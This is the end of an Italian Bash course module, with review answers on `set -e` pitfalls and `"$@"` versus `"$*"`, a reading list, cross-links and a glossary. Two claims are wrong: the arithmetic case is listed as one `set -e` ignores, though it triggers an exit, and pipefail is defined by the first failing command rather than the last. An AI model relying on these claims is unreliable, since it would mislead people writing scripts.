Descrivere tre scenari in cui `set -e` NON interrompe lo script nonostante un comando fallisca. Come si gestiscono correttamente questi casi?

<details>
<summary>Risposta</summary>

**Scenario 1: Contesto condizionale**

```bash
set -e
if failing_function; then echo "ok"; fi   # failing_function fallisce ma lo script continua
```

Tutti i comandi che sono parte della condizione di `if`, `while`, `until`, o a sinistra di `&&`/`||` sono esenti da `set -e`. Questo si propaga anche a tutte le funzioni chiamate da quel contesto.

**Scenario 2: Aritmetica che valuta a zero**

```bash
set -e
x=0
(( x++ ))   # Exit code 1 perché il valore post-incremento originale è 0
```

`(( ))` restituisce exit code 1 quando l'espressione valuta a 0. Soluzione: `(( x++ )) || true` oppure `x=$(( x + 1 ))`.

**Scenario 3: Comando in subshell senza inherit_errexit**

```bash
set -e
val=$(false; echo "continua")  # La subshell non eredita errexit
echo "$val"   # Stampa "continua"
```

Soluzione: `shopt -s inherit_errexit` (Bash 4.4+).

**Gestione corretta**: combinare `set -eEuo pipefail`, `shopt -s inherit_errexit`, e `trap ERR` per catturare il massimo numero di fallimenti. Per i contesti condizionali, verificare esplicitamente l'exit code dopo la chiamata.

Riferimento: Bash Reference Manual, sezione 4.3.1, semantica di `-e`. Consultato: 2026-05-23.
</details>

### Domanda 8

Spiegare la differenza tra `"$@"` e `"$*"` dentro una funzione. Quando si usa ciascuna forma?

<details>
<summary>Risposta</summary>

`"$@"` espande ciascun parametro posizionale come una parola separata, preservando i confini degli argomenti originali. `"$*"` concatena tutti i parametri in un'unica stringa, separati dal primo carattere di `$IFS` (default: spazio).

```bash
args_demo() {
    echo "--- \"\$@\" ---"
    for arg in "$@"; do echo "  [$arg]"; done

    echo "--- \"\$*\" ---"
    for arg in "$*"; do echo "  [$arg]"; done
}

args_demo "hello world" "foo bar" "baz"
# --- "$@" ---
#   [hello world]
#   [foo bar]
#   [baz]
# --- "$*" ---
#   [hello world foo bar baz]
```

**Usare `"$@"`** quasi sempre: per passare argomenti a un altro comando, per iterare su argomenti, per costruire array.

**Usare `"$*"`** solo quando si vuole esplicitamente una singola stringa concatenata, ad esempio per un messaggio di log: `log INFO "Argomenti ricevuti: $*"`.

Senza quoting, sia `$@` che `$*` sono soggetti a word splitting e glob expansion — mai usare senza doppi apici.

Riferimento: Bash Reference Manual, sezione 3.4.2 «Special Parameters», descrizione di `@` e `*`. Consultato: 2026-05-23.
</details>

---

## Letture Primarie Consigliate

1. **Bash Reference Manual (GNU)** — La reference ufficiale e completa per Bash.
   https://www.gnu.org/software/bash/manual/bash.html
   Consultato: 2026-05-23.

2. **POSIX.1-2024 Shell & Utilities** — La specifica POSIX per la shell e le utility. Essenziale per scrivere script portabili.
   https://pubs.opengroup.org/onlinepubs/9799919799/
   Consultato: 2026-05-23.

3. **ShellCheck Wiki** — Documentazione degli oltre 300 warning di ShellCheck, ciascuno con spiegazione, esempio e fix.
   https://github.com/koalaman/shellcheck/wiki
   Consultato: 2026-05-23.

4. **bats-core Documentation** — Guida completa al framework di testing bats-core.
   https://bats-core.readthedocs.io/en/stable/
   Consultato: 2026-05-23.

5. **GNU Parallel Documentation** — Tutorial e reference per GNU parallel.
   https://www.gnu.org/software/parallel/parallel_tutorial.html
   Consultato: 2026-05-23.

6. **Google Shell Style Guide** — Guida di stile per script Bash adottata internamente da Google.
   https://google.github.io/styleguide/shellguide.html
   Consultato: 2026-05-23.

7. **Wooledge BashFAQ / BashGuide** — FAQ e guida comunitaria con focus su errori comuni e best practice.
   https://mywiki.wooledge.org/BashFAQ
   https://mywiki.wooledge.org/BashGuide
   Consultato: 2026-05-23.

---

## Collegamenti Incrociati

| File | Relazione con questo modulo |
|---|---|
| [02-shell-mastery.md](02-shell-mastery.md) | Prerequisito: fondamenti di shell interattiva, espansioni, redirection |
| [09-gestione-processi.md](09-gestione-processi.md) | Approfondimento su segnali, job control, nice/renice, cgroups |
| [11-sicurezza.md](11-sicurezza.md) | Principi generali di sicurezza applicati negli script (input validation, privilegi minimi) |
| [13-logging.md](13-logging.md) | Architettura del logging su Linux: rsyslog, journald, logrotate |
| [21-automazione.md](21-automazione.md) | Cron, systemd timers, at — scheduling degli script trattati in questo modulo |
| [22-troubleshooting.md](22-troubleshooting.md) | Metodologie generali di troubleshooting che gli script di questo modulo automatizzano |
| [34-hardening-sicurezza-avanzata.md](34-hardening-sicurezza-avanzata.md) | Hardening del sistema: contesto in cui gli script difensivi operano |
| [31-ansible-guida-operativa.md](31-ansible-guida-operativa.md) | Quando la complessità dello script supera la manutenibilità: migrazione a Ansible |

---

## Glossario Locale

| Termine | Definizione |
|---|---|
| **Array associativo** | Struttura dati Bash (da 4.0+) che mappa chiavi stringa a valori. Dichiarato con `declare -A`. Equivalente di hash map / dizionario in altri linguaggi. |
| **bashismo** | Funzionalità specifica di Bash non presente nella specifica POSIX sh. Esempi: `[[ ]]`, array, process substitution, `<<<`. |
| **command substitution** | Costrutto `$(comando)` o `` `comando` `` che cattura lo stdout di un comando in una stringa. La forma `$()` è preferita per la leggibilità e l'annidabilità. |
| **coproc** | Costrutto Bash (4.0+) che avvia un processo in background con stdin/stdout collegati a file descriptor del processo padre. |
| **errexit** | Opzione di shell (`set -e`) che interrompe lo script quando un comando restituisce un exit code diverso da zero, con eccezioni per i contesti condizionali. |
| **FIFO** | First In, First Out. Sinonimo di named pipe: file speciale nel filesystem che implementa un canale di comunicazione unidirezionale tra processi. |
| **flock** | Utility Linux per lock advisory basati su file descriptor. Atomico, immune a stale lock, rilascio automatico alla chiusura del fd. |
| **glob** | Pattern di pathname expansion della shell: `*` (qualsiasi stringa), `?` (singolo carattere), `[...]` (classe di caratteri). |
| **here document** | Costrutto `<<DELIMITATORE ... DELIMITATORE` che fornisce input multi-riga a un comando. Con quote sul delimitatore (`<<'EOF'`) disabilita l'espansione delle variabili. |
| **here string** | Costrutto `<<<stringa` che fornisce una stringa come stdin di un comando. Estensione Bash. |
| **IPC** | Inter-Process Communication. Meccanismi per lo scambio di dati tra processi: pipe, named pipe, socket, shared memory, segnali. |
| **nameref** | Variabile Bash (4.3+) dichiarata con `declare -n` che funge da riferimento a un'altra variabile. Utile per passare array a funzioni. |
| **nounset** | Opzione di shell (`set -u`) che genera errore quando si espande una variabile non definita. |
| **PID file** | File che contiene il PID di un processo daemon, usato per verificare se il daemon è in esecuzione e per inviare segnali. |
| **pipefail** | Opzione di shell (`set -o pipefail`) che fa sì che una pipeline restituisca l'exit code del primo comando che fallisce, anziché quello dell'ultimo. |
| **process substitution** | Costrutto Bash `<(comando)` o `>(comando)` che presenta lo stdout/stdin di un comando come un file, tipicamente tramite `/dev/fd/N`. |
| **ShellCheck** | Strumento di analisi statica per script shell. Rileva errori comuni, bashismi non intenzionali, e problemi di quoting/sicurezza. |
| **subshell** | Copia del processo shell corrente creata da `(...)`, pipe `|`, o `$()`. Le modifiche alle variabili nella subshell non si propagano al processo padre. |
| **trap** | Comando Bash per registrare handler per segnali e pseudo-segnali (`EXIT`, `ERR`, `DEBUG`, `RETURN`). |
| **word splitting** | Meccanismo della shell che divide le espansioni non quotate in parole separate usando i caratteri in `$IFS` (default: spazio, tab, newline). |
